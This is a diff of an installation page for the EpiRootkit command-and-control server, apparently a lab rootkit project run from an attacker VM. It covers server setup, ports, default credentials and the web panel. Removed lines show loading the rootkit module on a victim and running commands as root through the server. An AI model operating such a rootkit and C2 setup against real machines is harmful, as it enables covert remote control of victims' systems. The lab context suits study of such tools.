@@ -1,6 +1,6 @@
 ---
 title: "Installation"
-description: "Step-by-step installation and setup guide"
+description: "C2 server installation in attacker VM environment"
 icon: "download"
 date: "2025-05-25T00:00:00+01:00"
 lastmod: "2025-05-25T16:00:00+01:00"
@@ -9,129 +9,106 @@ toc: true
 weight: 302
 ---
 
-# Installation Guide
+# C2 Server Installation
 
-Setup instructions for the EpiRootkit C2 server.
+The C2 server runs inside the **attacker VM** (192.168.200.11), not on the host system.
 
-## Prerequisites
+## Quick Setup
 
-### Required Software
-- **Node.js**: Version 18+ 
-- **pnpm**: Package manager (recommended)
+**Complete attacker VM setup with C2 server:**
+👉 **[Attacker VM Setup Guide](../../02-setup/attacking-vm-setup.md)**
 
-### Verify Installation
+This covers everything: Node.js installation, project transfer, dependencies, and C2 server launch.
+
+## VM-Only Installation
+
+If you already have the attacker VM configured and just need to install the C2 server:
+
+### Prerequisites
+- **Attacker VM running**: Ubuntu with Node.js 12+
+- **Project files**: Available in VM (via git, scp, or shared folder)
+- **Network**: VM can reach port 4444 (victim connections)
+
+### Installation Steps
+
 ```bash
-node --version
-# v18.17.0
-
-pnpm --version
-# 8.6.2
-
-# Install pnpm if missing
-npm install -g pnpm
-```
-
-## Installation
-
-### 1. Install Dependencies
-```bash
+# Inside attacker VM (192.168.200.11)
 cd attacking_program
+
+# Install dependencies
 pnpm install
-# ✓ Dependencies installed successfully
-```
+# ✓ Dependencies installed
 
-### 2. Review Configuration
-```bash
+# Verify configuration
 cat config.env
-```
+# C2_PORT=4444
+# WEB_PORT=3000
+# PASSWORD_HASH=b109f3bbbc...
 
-**Default Settings:**
-```bash
-# Server ports
-C2_PORT=4444                    # C2 server port
-WEB_PORT=3000                   # Web interface port
-
-# Authentication (SHA-512 of "password")
-PASSWORD_HASH=b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86
-
-# XOR Encryption
-ENCRYPTION_KEY=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef  # 32-byte hex key
-ENABLE_ENCRYPTION=true          # XOR encryption enabled by default
-```
-
-### 3. Start Server
-```bash
+# Start server
 pnpm start
-# ✓ Server started on port 4444
+# ✓ C2 server started on port 4444
 # ✓ Web interface started on port 3000
-# c2-server$ 
+```
+
+## Configuration Options
+
+### Environment Settings
+```bash
+# Edit config.env in attacker VM
+C2_PORT=4444               # Port for victim connections
+WEB_PORT=3000              # Web interface port
+ENCRYPTION_KEY=secret32hex  # XOR encryption key (32 hex chars)
+ENABLE_ENCRYPTION=true     # Enable XOR encryption
+PASSWORD_HASH=hash         # SHA-512 authentication hash
+```
+
+### Change Default Password
+```bash
+# Generate new SHA-512 hash
+echo -n "newpassword" | sha512sum
+# Copy hash to config.env as PASSWORD_HASH
+```
+
+
+## Access Points
+
+### CLI Interface
+```bash
+# Direct access in attacker VM
+pnpm start
+# c2-server$ help
+# c2-server$ ls
+```
+
+### Web Interface
+**From any device on the network:**
+- **URL**: `http://192.168.200.11:3000`
+- **Login**: `password` (or your custom password)
+- **Features**: Full CLI functionality via web
+
+### Remote Access
+```bash
+# From host or other VMs
+ssh attacker@192.168.200.11
+cd attacking_program && pnpm start
 ```
 
 ## Verification
 
-### CLI Interface
+### Test CLI
 ```bash
-# Test CLI commands
-help
-# EpiRootkit C2 Commands
-# clients                    - List connected clients
-# auth <client> <password>   - Authenticate with client
-# ...
+c2-server$ help
+# Shows available commands
 
-ls
+c2-server$ ls  
 # No clients connected (initially)
 ```
 
-### Web Interface
-Access at: `http://localhost:3000`
-- Login with password: `password`
-- Dashboard shows connected clients
-- All CLI features available via web
+### Test Web Interface
+1. **Open browser**: `http://192.168.200.11:3000`
+2. **Login**: Enter password `password`
+3. **Dashboard**: Should show "No clients connected"
 
-## Configuration Options
 
-### Change Ports
-```bash
-# Edit config.env
-C2_PORT=8080        # Custom C2 port
-WEB_PORT=8000       # Custom web port
-```
-
-### Change Password
-```bash
-# Generate new SHA-512 hash
-echo -n "newpassword" | sha512sum
-# Copy the hash to config.env as PASSWORD_HASH
-```
-
-### Disable Encryption
-```bash
-# Edit config.env
-ENABLE_ENCRYPTION=false
-```
-
-## Quick Test
-
-### 1. Connect Rootkit (victim machine)
-```bash
-sudo insmod epirootkit.ko
-# C2 shows: ✓ Client-1 Connected
-```
-
-### 2. Authenticate
-```bash
-auth Client-1 password
-# ✓ Authenticated
-# SUCCESS: Authentication successful
-```
-
-### 3. Test Commands
-```bash
-exec Client-1 whoami
-# Exit code: 0
-# Output: root
-
-status Client-1
-# EpiRootkit Status: Version 1.0.0, Authentication: YES
-```
-
+For complete VM setup including Node.js installation, see **[Attacker VM Setup](../../02-setup/attacking-vm-setup.md)**.
